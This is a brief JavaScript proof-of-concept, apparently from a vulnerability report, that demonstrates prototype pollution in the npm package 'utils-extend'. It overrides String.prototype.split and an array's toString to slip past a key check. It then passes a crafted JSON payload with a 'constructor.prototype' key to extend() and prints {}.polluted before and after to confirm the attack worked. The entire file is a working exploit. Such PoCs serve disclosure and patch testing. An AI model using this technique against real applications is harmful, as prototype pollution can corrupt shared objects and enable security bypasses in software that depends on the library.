var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const {extend} = require('utils-extend');
const payload = '{"constructor.prototype": {"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject);
console.log({}.polluted);